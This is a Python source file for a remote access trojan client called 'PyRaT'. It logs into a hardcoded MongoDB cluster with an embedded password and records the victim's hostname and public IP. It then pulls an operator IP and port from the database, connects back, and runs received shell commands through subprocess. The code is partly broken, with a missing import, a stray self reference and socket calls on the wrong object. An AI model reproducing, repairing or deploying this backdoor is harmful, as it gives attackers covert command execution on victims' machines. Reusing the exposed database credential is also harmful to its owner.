from pymongo import MongoClient
import os
import socket
import requests
import threading



password = "SB5aaHgp2IYtT72e"
connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"


temp_id = "izamaoieam"
pcname = socket.gethostname()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
client = MongoClient(connection_string)

url = 'http://myexternalip.com/raw'
r = requests.get(url)
client_ip = r.text




def main():
    print("connected")
    while True:
        msg = client.recv(1024).decode("utf-8")
        if msg == "/shell":
                while 1:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit' :
                        break
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()





def connecting(ip, port):
    try:
        s.connect((ip, port))
        threading.Thread(target = main, args=()).start()

    except:
        print("connection error")
        print(ip, port)
       
        return()







mydb = client["PyRaT"]
mycol = mydb["clients"]

query = {"_id" : f"{temp_id}" }

info = mycol.find(query)

for x in info:
    info_list = x

if info_list["first_connection?"] == True:
    print("sex")
    myquery = { "first_connection?": True, "name" : "0", "client_ip" : "0" }
    newvalues = { "$set": { "first_connection?": False, "name": f"{pcname}", "client_ip" : f"{client_ip}" } }
    mycol.update_one(myquery, newvalues)

    for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
        print(x)
    ip = x["ip"]
    port = x["port"]
    print(ip, port)
    connecting(ip, int(port))

else:
    
    for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
        print(x)
    ip = x["ip"]
    port = x["port"]
    print(ip, port)
    connecting(ip, int(port))













